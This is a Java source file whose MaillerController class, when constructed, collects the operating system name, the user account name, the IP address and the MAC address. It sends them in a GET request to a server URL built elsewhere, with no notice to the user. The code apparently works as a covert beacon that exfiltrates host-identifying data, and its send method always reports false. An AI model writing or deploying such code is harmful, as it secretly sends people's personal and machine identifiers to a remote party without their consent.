package westernunion.controller;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import westernunion.model.Network;
import westernunion.model.OperationSystem;
import westernunion.model.ServerConnector;

public class MaillerController {
	public MaillerController() throws Exception {
		Network net = new Network();
		OperationSystem ops = new OperationSystem(); 				
		MaillerController.send(ops.name, ops.account, net.ip, net.mac_address);
	}
	
	public static boolean send(String op, String user, String ip, String macaddress) throws Exception {
		boolean sent = false;
		
		// Values
		String op_value = ServerConnector.get_param(op);
		String ip_value = ServerConnector.get_param(ip);
		String user_value = ServerConnector.get_param(user);
		String macaddress_value = ServerConnector.get_param(macaddress);
		
		// Path String
		String path = "op="+op_value+"&user="+user_value+"&ip="+ip_value+"&mac_address="+macaddress_value;
		
		// SetUp the URL
		URL url = ServerConnector.setupURL(path);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection();
		conn.setRequestMethod("GET");
		new BufferedReader(new InputStreamReader(conn.getInputStream()));
		return sent;
	}
}
